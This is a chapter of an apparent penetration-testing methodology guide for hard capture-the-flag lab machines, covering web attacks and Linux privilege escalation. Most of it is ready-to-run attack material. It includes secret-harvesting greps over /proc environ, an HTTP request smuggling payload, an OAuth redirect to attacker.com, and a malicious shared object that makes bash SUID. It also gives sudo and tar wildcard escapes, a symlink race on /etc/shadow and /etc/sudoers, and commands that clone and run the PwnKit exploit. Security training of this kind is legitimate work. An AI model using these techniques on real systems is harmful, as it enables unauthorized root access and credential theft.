[◀ Prev: Medium Machines](08-medium-machines.md) · [🏠 Index](README.md) · [Next: Insane Machines ▶](10-insane-machines.md)

---

# 09 · 🔴 Hard Machines — Complete Methodology

> [!NOTE]
> **Hard machine mindset.** Hard machines require 3–4 step chains and non-obvious thinking. The foothold might involve custom software exploitation, chaining multiple minor vulnerabilities, or a non-public CVE in an obscure service. Privilege escalation often requires understanding how Linux works at a deeper level — shared library loading, kernel features, process isolation, or complex sudo rules with edge cases. Research the specific software version you find. Read its source code if you can access it.

## 9.1 Hard Machine — Extended Enumeration Techniques

```bash
# Source code analysis — look for secrets and logic flaws
# If you can access web source:
grep -r 'password\|secret\|key\|token\|api' /var/www/html/ 2>/dev/null
grep -r 'exec\|system\|shell_exec\|passthru\|eval' /var/www/html/ 2>/dev/null

# Git repository enumeration (if /.git found)
git log --oneline
git show HEAD~1              # Previous commits may contain secrets
git log -p | grep -i 'password\|secret\|key'

# Environment variables
env
cat /proc/self/environ | tr '\0' '\n'
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | sort -u | grep -i 'pass\|key\|secret\|token'

# Check for interesting binaries not in standard paths
find / -type f -executable 2>/dev/null | grep -v '/sys\|/proc\|/usr/bin\|/usr/sbin\|/bin\|/sbin'
ls -la /opt/ /srv/ /custom/ /app/ /data/ 2>/dev/null
```

## 9.2 Advanced Web — Hard Machine Vectors

### HTTP Request Smuggling

```http
# CL.TE — Content-Length takes precedence on frontend, TE on backend
POST / HTTP/1.1
Host: TARGET
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```text
# Use Burp Suite HTTP Request Smuggler extension
# Or: smuggler.py tool for automated detection
```

### OAuth 2.0 Attacks

```text
# Common OAuth vulnerabilities:

# 1. Open redirect in redirect_uri
#    Change redirect_uri to attacker domain:
/oauth/authorize?client_id=APP&redirect_uri=https://attacker.com&response_type=code

# 2. CSRF in OAuth flow — missing state parameter
#    Craft link that initiates OAuth without state validation

# 3. Authorization code leakage via Referer header
#    If page after OAuth redirect includes a link to external resource

# 4. Scope manipulation
#    Add elevated scopes to authorization request
/oauth/authorize?...&scope=email+profile+admin
```

### GraphQL Exploitation

```bash
# Test for GraphQL endpoint
curl -s -X POST http://$TARGET/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'

# Introspection query — dump full schema
curl -s -X POST http://$TARGET/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# GraphQL IDOR — try accessing other users' data
curl -X POST http://$TARGET/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id: 2) { username email password } }"}'

# Batch query for brute force (bypasses rate limiting per request)
# Send 100 queries in one HTTP request
```

## 9.3 Hard Machine — Advanced PrivEsc Techniques

### Shared Object Injection

```bash
# Find SUID binary loading missing shared object
find / -perm -u=s -type f 2>/dev/null -exec ldd {} \; 2>&1 | grep 'not found'
# Example: SUID binary loads /usr/lib/custom.so which doesn't exist
#          AND /usr/lib is writable
```

```c
// Create malicious shared object — /tmp/inject.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("chmod +s /bin/bash");
}
```

```bash
gcc -shared -fPIC -nostartfiles -o /usr/lib/custom.so /tmp/inject.c
# Run the SUID binary
/path/to/suid_binary
/bin/bash -p
```

### Sudo Wildcard / Edge Case Exploitation

```bash
# Example sudo rule with wildcard:
#   (root) NOPASSWD: /opt/scripts/*.sh
# Bypass with path traversal:
sudo /opt/scripts/../../../bin/bash

# Example: sudo rsync
#   (root) NOPASSWD: /usr/bin/rsync
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' . .

# Example: sudo git
#   (root) NOPASSWD: /usr/bin/git
sudo git -p log    # Enter pager -> !/bin/bash

# Example: sudo journalctl
#   (root) NOPASSWD: /usr/bin/journalctl
sudo journalctl    # In pager -> !/bin/bash

# sudo with env variable edge case
# CVE-2019-14287: sudo < 1.8.28
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
```

### Cron with tar/find Wildcard Injection

```bash
# Root cron: cd /home/user && tar -czf /backup/backup.tar.gz *
# Wildcard * expands to all files — we create files that look like tar flags
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh privesc.sh'
cat > privesc.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x privesc.sh
# When tar runs as root, it executes our script
# After cron fires:
ls -la /bin/bash
/bin/bash -p
```

### Race Condition

```bash
# Example: SUID script creates temp file predictably
# Script does: cp /etc/shadow /tmp/shadow_$$ && cat /tmp/shadow_$$

# Create symlink race
while true; do
  ln -sf /etc/shadow /tmp/shadow_* 2>/dev/null
  ln -sf /etc/sudoers /tmp/shadow_* 2>/dev/null
done &

# Run the target while race is running
/path/to/vulnerable_suid

# Or use inotifywait for more precise timing
inotifywait -m /tmp -e create | while read dir action file; do
  ln -sf /etc/sudoers /tmp/$file
done
```

### Kernel Exploitation

```bash
# Check kernel version
uname -r
uname -a
cat /proc/version

# Linux exploit suggester
/tmp/les.sh 2>/dev/null | grep -i 'probable\|highly probable'

# Key kernel exploits by version range:
#   DirtyCow  (CVE-2016-5195): kernel < 4.8.3
#   DirtyPipe (CVE-2022-0847): kernel 5.8 to 5.16.11
#   PwnKit    (CVE-2021-4034): polkit pkexec — all Linux versions
#   Baron Samedit (CVE-2021-3156): sudo < 1.9.5p2

# DirtyPipe — write arbitrary data to read-only root files
#   Including /etc/passwd
#   Compile and run: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

# PwnKit (CVE-2021-4034) — almost universal privesc
git clone https://github.com/ly4k/PwnKit && cd PwnKit
chmod +x PwnKit && ./PwnKit

# Baron Samedit
# sudoedit -s '\' $(python3 -c 'print("A"*65536)')
```

---

[◀ Prev: Medium Machines](08-medium-machines.md) · [🏠 Index](README.md) · [Next: Insane Machines ▶](10-insane-machines.md)
